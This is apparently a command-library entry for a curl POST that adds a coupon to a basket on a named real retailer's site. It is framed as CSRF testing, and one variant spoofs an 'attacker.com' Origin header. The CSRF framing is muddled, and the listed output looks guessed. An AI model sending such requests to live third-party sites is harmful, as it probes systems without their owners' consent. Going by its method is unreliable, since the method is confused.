---
data: >-
  curl -X POST
  'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket'
  -d 'couponcode=BOGO50&format=ajax' -H 'Cookie: session=your_cookie_here'
tags:
  - web
  - csrf
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.811Z'
id: 43da8a6a-0560-4c01-96f1-d2a4440981e6
verified: false
validated: true
submitted: true
---
# curl-add-coupon-csrf

## Command

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket' -d 'couponcode=BOGO50&format=ajax' -H 'Cookie: session=your_cookie_here'
```

## Description

This command simulates a POST request to add the 'BOGO50' coupon to the Teavana shopping basket, useful for reproducing or testing CSRF vulnerabilities by replaying the request with a valid session cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| URL | The vulnerable endpoint path | Yes |
| `-d 'couponcode=BOGO50&format=ajax'` | Form data parameters for coupon code and AJAX response | Yes |
| `-H 'Cookie: session=your_cookie_here'` | Includes the authentication session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket' -d 'couponcode=BOGO50&format=ajax' -H 'Cookie: session=abc123'
```

### Advanced Usage

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket' -d 'couponcode=BOGO50&format=ajax' -H 'Cookie: session=abc123' -H 'Origin: http://attacker.com' -v
```

## Expected Output

A JSON or AJAX response indicating successful coupon application, such as {"success": true, "message": "Coupon added"}. If unauthenticated, expect an error like 401 Unauthorized.

## Related

- [[Related Procedure: Verify Missing CSRF Protection]]
